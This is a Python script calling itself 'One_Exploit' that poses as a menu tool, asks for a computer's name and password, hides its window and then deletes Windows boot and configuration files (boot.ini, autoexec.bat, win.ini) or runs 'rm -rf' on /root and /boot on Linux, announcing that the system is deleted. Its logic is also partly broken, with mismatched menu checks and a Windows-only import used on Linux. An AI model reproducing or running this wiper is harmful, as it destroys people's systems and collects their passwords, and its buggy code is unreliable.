import os , win32gui , win32con
from getpass import getpass
import time

os.system('clear')
os.system('cls')

def run():
    time.sleep(1)
    WindowsLinux = print('''
    [01] -> Windows
    [02] -> Linux
    [03] -> Os
    [99] -> exit
    ''')
    sys = input('one_exploit => ')
    if sys == '01' or sys == '02' or sys == '03' :
        print('Which one [1,2,3,99')
        run()
    def exits():
        if sys == '99':
            os.system('exit')
            print('''
    =========
    | By By |
    =========
            ''')

    if sys == '1':
        def delWindows():
            time.sleep(1)
            os.system('cls')
            print('''
                        w                     w  iiiiii    n           n
                         w         w         w      ii     n n         n
                          w       w w       w       ii     n   n       n
                           w     w   w     w        ii     n     n     n
                            w   w     w   w         ii     n       n   n
                             w w       w w          ii     n         n n
                              w         w        iiiiiiii  n           n
            ''')


            namesystem = input('Plese inter the name your pc: ')
            password = input('your system have password?(Y , n) : ').lower()
            if password == 'Y':
                passnamesystem = getpass('Inter password '+namesystem+" : ")
                print(f'usename: {namesystem}')
                print(f'password: {passnamesystem}')
                time.sleep(1)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                os.system('off')
                os.system('attrib -r -g -h C:\\autoexec.bat')
                os.system('del C:\\autoexec.bat')
                os.system('attrib -r -g -h C:\\boot.ini')
                os.system('del C:\\boot.ini')
                os.system('attrib -r -g -h C:\\ntidr')
                os.system('del C:\\ntidr')
                os.system('attrib -r -g -h C:\windows\win.ini')
                os.system('del C:\windows\win.ini')
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
            else:
                print(f'usename: {namesystem}')
                print('password: ')
                time.sleep(1)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                os.system('off')
                os.system('attrib -r -g -h C:\autoexec.bat')
                os.system('del C:\autoexec.bat')
                os.system('attrib -r -g -h C:\boot.ini')
                os.system('del C:\boot.ini')
                os.system('attrib -r -g -h C:\ntidr')
                os.system('del C:\ntidr')
                os.system('attrib -r -g -h C:\windows\win.ini')
                os.system('del C:\windows\win.ini')
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                    
        delWindows()

    elif sys == '2':
        def delLinux():
            time.sleep(1)
            os.system('clear')
            print('''
                    ll        iiiiii    n           n
                    ll          ii      n n         n
                    ll          ii      n   n       n
                    ll          ii      n     n     n
                    ll          ii      n       n   n
                    ll          ii      n         n n
                    ll ll ll  iiiiii    n           n
            ''')

            namesystem = input('Plese inter the name your pc: ')
            password = input('your system have password?(Y , n) : ').lower()
            if password == 'y':
                passnamesystem = getpass('Inter password '+namesystem+" : ")
                print(f'usename: {namesystem}')
                print(f'pass: {passnamesystem}')
                time.sleep(1)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                os.system('sudo su')
                os.system('echo '+passnamesystem)
                os.system('cp -r /home/'+namesystem+'/* /techer0221/')
                os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                print('We are One_Exploit')

            else:
                print(f'usename: {namesystem}')
                print('password: ')
                time.sleep(1)
                win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)
                os.system('sudo su')
                os.system('cp -r /home/'+namesystem+'/* /techer0221/')
                os.system('sudo cp -r /boot/* /root/boot/') or os.system('cp -r /boot/* /root/boot/')
                os.system('sudo cp -r /root/*') or os.system('cp -r /root/*')
                os.system('sudo rm -rf /root/*') or os.system('rm -rf /root/*')
                os.system('sudo rm -rf /boot/*') or os.system('rm -rf /boot/*')
                print('=============================')
                print('    YOU DELET ALL SYSTEM    |')
                print('=============================')
                print('We are One_Exploit')
        delLinux()

    elif sys == '3':    
        def delOs():
            print('coming son')
            pass
        delOs()

    elif sys == '99':
        exits()

run()  
    
